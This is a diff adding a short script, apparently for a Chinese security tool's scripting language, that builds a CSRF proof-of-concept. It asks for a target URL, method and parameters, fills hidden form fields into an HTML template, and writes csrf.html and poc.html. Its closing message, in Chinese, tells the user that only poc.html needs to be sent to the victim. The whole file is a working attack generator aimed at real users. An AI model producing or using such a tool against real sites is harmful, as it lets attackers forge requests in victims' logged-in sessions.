@@ -1,0 +1,40 @@
+#define htqian = <input type="hidden" name="
+#define htzhong = " value="
+#define hthou = " />
+#define yin = "
+function splitPars(par){
+	return StrSplit(par,"&");
+}
+function splitArg(arg){
+	return StrSplit(arg,"=");
+}
+function main(args)
+{
+	print("请输入请求地址:");url = input();
+	print("请输入请求方式(GET/POST)");
+	destURL = "";
+	if("POST" == input()){
+		destURL = yin.url.yin." method=".yin."POST".yin;
+	}else{
+		destURL = yin.url.yin;
+	}
+	print("请输入提交的参数:");
+	pars = splitPars(input());
+	parsNum = GetArrayNum(pars);
+	i = 0;
+	AllInput = "";
+	while(i<parsNum){
+		Args = splitArg(pars[ToInt(i)]);
+		if(GetArrayNum(Args) ==1){
+			ArrayAddEle(Args,"");
+		}
+		AllInput = AllInput.htqian.URLDecode(Args[0]).htzhong.URLDecode(Args[1]).hthou.StrRN();
+		i=i+1;
+	}
+	csrf = StrReplace(StrReplace(ReadFile("csrfDemo.html"),"DESTURL",destURL),"AllINPUT",AllInput);
+	print("请输入要保存的文件夹路径:");
+	path = input();
+	WriteFile(path."\csrf.html",csrf);
+	WriteFile(path."\poc.html",ReadFile("poc.html"));
+	print("输出了一个csrf.html和poc.html,要一起使用,但是发给受害者只需要发送poc.html的页面即可");
+}
